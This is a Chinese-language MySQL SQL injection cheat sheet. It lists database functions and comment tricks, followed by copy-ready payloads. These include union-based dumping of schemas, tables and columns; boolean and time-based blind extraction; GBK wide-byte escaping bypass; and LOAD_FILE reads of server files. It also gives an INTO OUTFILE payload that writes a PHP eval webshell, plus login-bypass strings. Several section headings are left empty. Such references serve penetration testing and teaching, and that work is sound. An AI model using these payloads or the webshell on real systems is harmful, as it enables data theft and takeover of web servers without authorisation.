# 0x01 基本
## 查看当前数据库版本
+ VERSION()
+ @@VERSION
+ @@GLOBAL.VERSION

## 当前登录用户
+ USER()
+ CURRENT_USER()
+ SYSTEM_USER()
+ SESSION_USER()

## 当前使用的数据库
+ DATABASE()
+ SCHEMA()

## 路径相关
+ @@BASEDIR : mysql安装路径：
+ @@SLAVE_LOAD_TMPDIR : 临时文件夹路径：
+ @@DATADIR : 数据存储路径：
+ @@CHARACTER_SETS_DIR : 字符集设置文件路径
+ @@LOG_ERROR : 错误日志文件路径：
+ @@PID_FILE : pid-file文件路径
+ @@BASEDIR : mysql安装路径：
+ @@SLAVE_LOAD_TMPDIR : 临时文件夹路径：

## 联合数据
+ CONCAT()
+ GROUP_CONCAT()
+ CONCAT_WS()

## 字母/数字相关
+ ASCII(): 获取字母的ascii码值
+ BIN(): 返回值的二进制串表示
+ CONV(): 进制转换
+ FLOOR()
+ ROUND()
+ LOWER()：转成小写字母
+ UPPER(): 转成大写字母
+ HEX():十六进制编码
+ UNHEX()：十六进制解码


## 字符串截取
+ MID()
+ LEFT()
+ SUBSTR()
+ SUBSTRING()

## 注释
### 行间注释
+ -- -  (--后面有个空格)
	+ DROP sampletable;--
+ #
	+ DROP sampletable;#
+ \` (反引号)

### 行内注释
+ /\* \*/
	+DROP/\* 内容 \*/sampletable;
+ /\*! 语句  \*/
	+  /\*! select \* from test \*/
	+ 语句会被执行

# 0x02 注入技术
## 判断是否存在注入
假设有: www.test.com/chybeta.php?id=1
### 数值型注入
```
chybeta.php?id=1+1
chybeta.php?id=-1 or 1=1
chybeta.php?id=-1 or 10-2=8
chybeta.php?id=1 and 1=2
chybeta.php?id=1 and 1=1
```
### 字符型注入
参数被引号包围，我们需要闭合引号。
```
chybeta.php?id=1'
chybeta.php?id=1"
chybeta.php?id=1' and '1'='1
chybeta.php?id=1" and "1"="1
```

## 联合查询
### 查询列数
用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。
#### UNION SELECT
```
UNION SELECT 1,2,3 #
UNION ALL SELECT 1,2,3 #
UNION ALL SELECT null,null,null #
```
#### ORDER BY
利用二分法
```
ORDER BY 10 #
ORDER BY 5  #
ORDER BY 2  #
....
```
### 查询数据库
```
UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA #
```
### 查询表名
```
UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #
```
假设获取到数据库名为"databasename"后，对其进行十六进制编码得到0x64617461626173656e616d65。
```
UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 #
```
### 查询列名
由前一步获取到表名为tablename后，对其进行十六进制编码得到
```
UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 #
```
### 获取数据
```
UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename #
```
## insert/update/delete注入
参考：[SQL Injection in Insert Update and Delete Statements](https://www.exploit-db.com/docs/33253.pdf)
假设后台语句为：
```
insert into user(id,name,pass) values (1,"chybeta","123456");
```



## order by后注入
此部分整理自[瞌睡龙:MySql注入科普](http://static.hx99.net/static/drops/tips-123.html)
oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。
### 检测方法
一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：

原始链接：http://www.test.com/list.php?order=vote 根据vote字段排序。

找到投票数最大的票数num然后构造以下链接，看排序是否变化。：
```
list.php?order=abs(vote-(length(user())>0)*num)+asc
```

还有一种方法不需要知道任何字段信息，使用rand函数：
```
list.php?order=rand(true)
list.php?order=rand(false)
```
以上两个会返回不同的排序。

### payload
判断表名中第一个字符是否小于128的语句如下：
```
http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
```
## 报错注入
## 盲注
### 盲注场景
在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。
+ 正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入
+ 正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。
+ 提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。

几种简单的判断语句，在真实利用中需要根据情况而变化:
+ CASE
+ IF()
+ IFNULL()
+ NULLIF()

### 布尔盲注-基于响应
提交一个逻辑判断语句，来推断一个个的信息位。由于注入需要（一般）一个个字符的进行，所以需要利用脚本，或者工具（比如burp suite）。以下是：

#### payload
```
// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。
// k ，结合limit，选择偏移为k的行
// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。
// SUBSTR() 也可以换成 SUBSTRING()

' OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) < j) #

' OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) < j) #  

' OR (SELECT SUBSTR(DATABASE(),i,1) < j) #

' OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j) #  

' OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) < j #

...
```
#### 脚本
脚本利用，可见：[ctf盲注利用脚本](https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/#CTF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95)
要点：
+ 注意编码问题
+ 注意异常处理
+ 注意边界处理

### 延时盲注-基于时间
一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：
+ SLEEP(n) 让mysql停n秒钟
+ BENCHMARK(count,expr) 重复countTimes次执行表达式expr

一些注意事项：
+ 使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。
+ 时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。
+ 当在页面上看不到任何明显变化时，再考虑选择使用延时注入。

#### 检测方法
```
1 OR SLEEP(25)=0 LIMIT 1 #
1) OR SLEEP(25)=0 LIMIT 1 #
1' OR SLEEP(25)=0 LIMIT 1 #
') OR SLEEP(25)=0 LIMIT 1 #
1)) OR SLEEP(25)=0 LIMIT 1 #
SELECT SLEEP(25) #
```

#### payload
```

UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j,BENCHMARK(100000,SHA1(1)),0)

UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j,SLEEP(10),0)

...
```
## 宽字节注入
### 原理
有如下php代码：
```php
...
mysql_query("SET NAMES 'gbk'");
....
$name = isset($_GET['name']) ? addslashes($_GET['name']) : 1;
$sql = "SELECT * FROM test WHERE names='{$name}'";
```
addslashes()会在单引号或双引号前加上一个`\`。当mysql使用GBK字符集时，会把两个字符当作一个汉字，如%df%5c为運字。我们输入`name=root%df%27`，%在服务器端会出现如下转换：`root%df%27` -> `root%df%5c%27` -> `root運'`。

更多内容可见：[浅析白盒审计中的字符编码及SQL注入](https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html)
### payload
#### 吃掉`\`
```
index.php?name=1%df'
index.php?name=1%a1'
index.php?name=1%aa'
...
```
在被addslashes后，出现%XX%5c，当前一个字符的ascii码值大于128时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅%df可以吃掉'\\'。

#### 利用`\`
```
index.php?name=%**%5c%5c%27
```

## 二次注入

## 文件读写
利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。
查询用户读写权限：
```
SELECT file_priv FROM mysql.user WHERE user = 'username';
```
### load_file()读取
#### 条件
+ 需要有读取文件的权限
+ 需要知道文件的绝对物理路径。
+ 要读取的文件大小必须小于 max_allowed_packet

```
SELECT @@max_allowed_packet;
```

#### payload

直接使用绝对路径,注意对路径中斜杠的处理。
```mysql
UNION SELECT LOAD_FILE("C://TEST.txt") #

UNION SELECT LOAD_FILE("C:/TEST.txt") #

UNION SELECT LOAD_FILE("C:\\TEST.txt") #
```
使用编码
```
UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #

UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #
```

### select导出
#### 条件
+ 一般要指定绝对路径
+ 需导出的目录有可写权限
+ 要outfile出的文件不能已经存在

#### payload
```
UNION SELECT DATABASE() INTO OUTFILE 'C:\\phpstudy\\WWW\\test\\1';

UNION SELECT DATABASE() INTO OUTFILE 'C:/phpstudy/WWW/test/1';
```

#### 写入webshell
##### 条件
+ 需要知道网站的绝对物理路径，这样导出后的webshell可访问
+ 对需导出的目录有可写权限。

##### payload
```
UNION SELECT  "<?php eval($_POST['chybeta'])?>" INTO OUTFILE 'C:/phpstudy/WWW/test/webshell.php';
```

## 万能密码后台登陆
+ admin' --
+ admin' #
+ admin'/*
+ or '=' or
+ ' or 1=1--
+ ' or 1=1#
+ ' or 1=1/*
+ ') or '1'='1--
+ ') or ('1'='1--

## PDO堆查询

# 0x03 绕过技巧
请见：[WAF Bypass:SQL Injection](https://chybeta.gitbooks.io/waf-bypass/content/sql-injection/ji-ben-guo-waf-zi-shi-hui-zong.html)


# 0X04 版本特性
+ mysql5.0以后  information.schema库出现
+ mysql5.1以后 udf 导入xx\\lib\\plugin\\ 目录下
+  mysql5.x以后 system执行命令

# 0x05 常见sql注入位置
+ 常见GET、POST参数
+ 登陆框
+ http头

# 0xx06 工具
## 自动sql注入测试
+ [sqlmap](http://sqlmap.org/)
+ Pangolin
+ 啊D

## 辅助工具
+ [Burp Suite](https:s//portswigger.net/burp/)
+ [firefox::HackBar](https://addons.mozilla.org/en-US/firefox/addon/hackbar1/?src=search)

# 0x07 参考
+ [MySQL_Testing_Injection](http://websec.ca/kb/sql_injection#MySQL_Testing_Injection)
+ [MySQL SQL Injection Cheat Sheet](http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/)
+ [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#Enablecmdshell)
+ [独自等待：MySQL注入总结](https://www.waitalone.cn/mysql-injection-summary.html	)
+ [chybeta:MySql注入备忘录 ](https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/)
